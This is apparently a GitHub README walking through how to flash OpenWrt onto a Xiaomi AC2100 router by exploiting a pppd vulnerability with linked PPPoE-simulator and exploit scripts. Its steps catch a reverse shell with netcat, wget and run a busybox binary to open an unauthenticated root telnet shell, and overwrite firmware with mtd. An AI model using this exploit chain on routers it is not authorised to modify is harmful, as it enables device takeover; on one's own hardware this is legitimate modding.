# AC2100 OpenWrt Guide

<p align="center">
    <img height="auto" width="auto" src="images/router_front.jpg" />
</p>

## Acknowledgements and resources

This guide is based on the video of [韩风 Talk](https://www.youtube.com/watch?v=xexqu3veedw). Since many people don't know any Mandarin or don't use Windows, I've decided to write down my method of getting this to work. This is also helping people to understand more about the process rather than using a one-click solution.

[pppoe-simulator.py](https://github.com/Percy233/PPPoE_Simulator-for-RM2100-exploit) by Percy233

[pppd-cve.py](https://gist.github.com/namidairo/1e3fb3404c9f148474c06ae6616962f3) by namidairo

## Intro and Setup

If you find any mistakes in this guide, _please_ submit a PR 👍🏻.

### **Disclaimer:**

**You can potentially brick your device. I don't take responsibility for any damage caused.**

### Requirements

1. A computer with an ethernet adapter
2. Two LAN cables
3. python3, scapy, netcat
4. Files from this repo
   - busybox
   - [pppoe-simulator.py](https://github.com/Percy233/PPPoE_Simulator-for-RM2100-exploit)
   - [pppd-cve.py](https://gist.github.com/namidairo/1e3fb3404c9f148474c06ae6616962f3)
   - xiaomi-router-kernel1.bin
   - xiaomi-router-rootfs0.bin

I'll be using a Macintosh in this guide. If you use Linux, I assume you are smart enough to install the required packages yourself. Please note that python3 is aliased to `python3` on macOS. Replace `python3` and `pip3` with `python` and `pip` on Windows/Linux accordingly.

Before we start, please check your python version with:

```sh
python --version
```

Version 2 will **not** work.

## Install packages (macOS specific)

Go to https://brew.sh/ and run the installation script in your terminal, then proceed to install the required packages:

`brew install python3 netcat`

Install `scapy` for python:

`pip3 install scapy`

## 1. Download files

- Clone the repo or download as `.zip`
- Make a folder with the following files and `cd` into it

<p align="center">
    <img height="auto" width="auto" src="images/1.png" />
</p>

## 2. Reset your router

- Plug in your AC2100
- Wait for the system light to turn blue
- Hold the reset button until the light turns yellow
- Plug out your router

## 3. Insert LAN cables

- Bridge WAN and Port 1 (blue) with your first LAN cable
- Connect the second LAN cable to Port 2 and your computer (yellow)

<p align="center">
    <img height="auto" width="auto" src="images/router_back.jpg" />
</p>

## 4. Setup TCP/IP

- Go to your network settings
- Set the following for IPv4

<p align="center">
    <img height="auto" width="auto" src="images/2.png" />
</p>

- Plug in your router
- Wait for the indicator LED to turn blue

You should now be able to ping the router at `192.168.31.1`.

<p align="center">
    <img height="auto" width="auto" src="images/3.png" />
</p>

## 5. Determining your network interface

- Run `ifconfig`
- Check for an interface with configured address `192.168.31.177` (see image below)
- Change the name of your interface in `ppd-cve.py` and `pppoe-simulator.py` (in my case it was en7)

```py
# Line 5 of both script files
interface = "yourinterface"
```

<p align="center">
    <img height="auto" width="auto" src="images/4.png" />
</p>

## 6. Setup PPPoE simulator

- Open up http://192.168.31.1 in your browser
- If there is a terms and conditions screen, click on 马上体验
- Click on 继续配置 (see image)

<p align="center">
    <img height="auto" width="auto" src="images/5.png" />
</p>

Start the `pppoe-simulator`:

```sh
python3 pppoe-simulator.py
```

You may need to run this as `root` for scapy to function properly. The script should show `Waiting for packets`.

<p align="center">
    <img height="auto" width="auto" src="images/6.png" />
</p>

Click on the field that says PPPOE.

<p align="center">
    <img height="auto" width="auto" src="images/7.png" />
</p>

Enter credentials (anything should be fine). I just use `123` for both. After that click on 下一步.

<p align="center">
    <img height="auto" width="auto" src="images/8.png" />
</p>

Requests should now appear in your PPPoE terminal window:

<p align="center">
    <img height="auto" width="auto" src="images/9.png" />
</p>

Also your web browser should now display this instead of a loading spinner:

<p align="center">
    <img height="auto" width="auto" src="images/10.png" />
</p>

## 7. Setup and run the exploit

Open up two new terminal sessions.

Start an HTTP server where we can `wget` the files from later. **Make sure to be in the folder that contains the repo files**.

```sh
python3 -m http.server 80
```

Start the `netcat` network utility.

```sh
netcat -nvlp 31337
```

<p align="center">
    <img height="auto" width="auto" src="images/11.png" />
</p>

Run `pppd-cve.py` in a new terminal session:

```sh
python3 pppd-cve.py
```

<p align="center">
    <img height="auto" width="auto" src="images/12.png" />
</p>

When the packet has been sent successfully, you should be able to see a connection from `192.168.31.1:63627` in your `netcat` session.

This connection can be unstable and you may need to rerun `netcat` and `pppd-cve.py` if it drops.

If you do the following commands quickly, there should be no issues:

```sh
cd /tmp
wget http://192.168.31.177/busybox
chmod a+x ./busybox
./busybox telnetd -l /bin/sh
```

<p align="center">
    <img height="auto" width="auto" src="images/13.png" />
</p>

We should now have `telnet` access (you can find all commands in `commands.txt`):

```sh
telnet 192.168.31.1
```

<p align="center">
    <img height="auto" width="auto" src="images/14.png" />
</p>

Use `wget` to pull our files from the http server on the router:

```sh
wget http://192.168.31.177/xiaomi-router-rootfs0.bin
wget http://192.168.31.177/xiaomi-router-kernel1.bin&&nvram set uart_en=1&&nvram set bootdelay=5&&nvram set flag_try_sys1_failed=1&&nvram commit
```

Observation: Files are being requested in your http server session:

<p align="center">
    <img height="auto" width="auto" src="images/15.png" />
</p>

All what is left now is to write our images:

```sh
mtd write xiaomi-router-kernel1.bin kernel1
mtd -r write xiaomi-router-rootfs0.bin rootfs0
```

<p align="center">
    <img height="auto" width="auto" src="images/16.png" />
</p>

Your device should now reboot. First the LED blinks yellow for a couple of seconds before turning blue. When it turns blue again, you now have successfully set up OpenWrt. Congratulations!

What you can do now:

- Close all terminal sessions
- Revert your TCP/IP settings
- Remove the bridge cable
- Connect the router to the internet again

## 7. Post-install

Connect to your device via `ssh`.

```
username: root
password: password
```

The router IP should be visible in your network settings (in my case http://192.168.1.1).

<p align="center">
    <img height="auto" width="auto" src="images/17.png" />
</p>

```sh
ssh root@routerip
```

<p align="center">
    <img height="auto" width="auto" src="images/18.png" />
</p>

The web interface `LuCI` is already included with Simplified Chinese on this image. If you are using **another image** you need to install `LuCI` manually:

```sh
opkg update
opkg install luci
```

To switch from Chinese to another language, please run the following (make sure to be connected to the internet):

```sh
opkg update
opkg install luci-i18n-base-en
```

If you need another language you can list all locale packages with:

```
opkg list luci-i18n-\*
```

Changing the language in the web interface:

<p align="center">
    <img height="auto" width="auto" src="images/19.png" />
</p>

<p align="center">
    <img height="auto" width="auto" src="images/20.png" />
</p>